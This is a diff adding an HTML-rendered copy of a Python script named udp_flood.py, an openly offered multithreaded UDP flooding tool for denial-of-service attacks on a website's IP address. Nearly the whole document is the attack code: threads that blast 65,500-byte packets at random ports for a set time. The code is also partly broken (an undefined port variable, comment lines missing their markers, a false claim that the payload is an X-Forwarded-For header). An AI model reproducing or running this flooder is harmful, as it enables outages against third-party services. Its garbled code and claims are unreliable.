@@ -1,0 +1,84 @@
+<html>
+<head>
+<title>udp_flood.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.s0 { color: #a9b7c6;}
+.s1 { color: #808080;}
+.s2 { color: #cc7832;}
+.s3 { color: #a5c261;}
+.s4 { color: #6897bb;}
+</style>
+</head>
+<body bgcolor="#2b2b2b">
+<table CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<tr><td><center>
+<font face="Arial, Helvetica" color="#000000">
+udp_flood.py</font>
+</center></td></tr></table>
+<pre>
+<span class="s1">#!/usr/bin/python</span>
+#  Advanced Multithreaded UDP Flooder coded by Fl0urite
+#   leak.sx
+#    Hope u leik!
+
+
+# imports from necessary packages
+<span class="s2">import </span><span class="s0">os</span>
+<span class="s2">import </span><span class="s0">sys</span>
+<span class="s2">import </span><span class="s0">time</span>
+<span class="s2">import </span><span class="s0">socket</span>
+<span class="s2">import </span><span class="s0">random</span>
+<span class="s2">from </span><span class="s0">threading </span><span class="s2">import </span><span class="s0">Thread</span>
+
+<span class="s1">#The IP of the website you wish to deed Dos</span>
+#Which can be found by performing a tracert(on windows )
+<span class="s0">ip=</span><span class="s3">'192.168.137.230'</span>
+
+<span class="s1">#How many threads of your computer you want to dedicate to this task</span>
+<span class="s0">threads=</span><span class="s4">50</span>
+
+<span class="s1">#how long you want the attact to lasts</span>
+<span class="s0">endtime=</span><span class="s4">60</span>
+
+<span class="s1">#The function that will be run across all the threads</span>
+<span class="s2">def </span><span class="s0">udp(ip</span><span class="s2">,</span><span class="s0">port</span><span class="s2">,</span><span class="s0">floodtime):</span>
+	<span class="s1">#varibles for used by all thereds</span>
+	<span class="s2">global </span><span class="s0">packets</span>
+	<span class="s2">global </span><span class="s0">threads</span>
+	<span class="s2">global </span><span class="s0">endtime</span>
+	<span class="s1">#counter</span>
+	<span class="s0">packets=</span><span class="s4">0</span>
+
+	<span class="s1">#data being sent to target</span>
+	#\xff is a X-Forwarded-For headed not normal classed as bad by filteing programs
+	<span class="s0">data=(</span><span class="s3">b&quot;</span><span class="s2">\xFF</span><span class="s3">&quot;</span><span class="s0">)*</span><span class="s4">65500</span>
+	<span class="s1">#makes a socket object and send the data for the set time limt</span>
+	<span class="s2">while </span><span class="s0">floodtime&gt;=time.clock():</span>
+		s=socket.socket(socket.AF_INET<span class="s2">,</span><span class="s0">socket.SOCK_DGRAM)</span>
+		randport=random.randrange(<span class="s4">1</span><span class="s2">,</span><span class="s4">65500</span><span class="s0">)</span>
+		s.sendto(data<span class="s2">,</span><span class="s0">(ip</span><span class="s2">,</span><span class="s0">randport))</span>
+
+		packets+=<span class="s4">1</span>
+	<span class="s1">#Here to let you know if a thread stops work running</span>
+	<span class="s2">print </span><span class="s0">(</span><span class="s3">&quot;Thread &quot;</span><span class="s0">+str(threads)+</span><span class="s3">&quot; Stopping...&quot;</span><span class="s0">)</span>
+
+	threads-=<span class="s4">1</span>
+
+
+<span class="s0">Creates all the multiple thread objects </span><span class="s2">and </span><span class="s0">starts them</span>
+<span class="s2">for </span><span class="s0">i </span><span class="s2">in </span><span class="s0">range(</span><span class="s4">0</span><span class="s2">,</span><span class="s0">threads):</span>
+	t=Thread(target=(udp)<span class="s2">,</span><span class="s0">args=(ip</span><span class="s2">,</span><span class="s0">port</span><span class="s2">,</span><span class="s0">endtime))</span>
+	t.start()
+time.sleep(endtime)
+
+<span class="s1">#A function that waits for all threads to be completed before executing the main application</span>
+<span class="s2">while </span><span class="s0">threads&gt;=</span><span class="s4">1</span><span class="s0">:</span>
+	<span class="s2">print </span><span class="s0">(</span><span class="s3">&quot;Waiting for &quot;</span><span class="s0">+str(threads)+</span><span class="s3">&quot; threads to finish...&quot;</span><span class="s0">)</span>
+	time.sleep(<span class="s4">1</span><span class="s0">)</span>
+An output of the  results of your attack
+<span class="s2">print</span><span class="s0">(</span><span class="s3">&quot;Sent &quot;</span><span class="s0">+str(packets)+</span><span class="s3">&quot; packets, averaging at ~&quot;</span><span class="s0">+str(packets/</span><span class="s4">16</span><span class="s0">/endtime)+</span><span class="s3">&quot; MB/s!&quot;</span><span class="s0">)</span>
+exit()
+</pre>
+</body>
+</html>
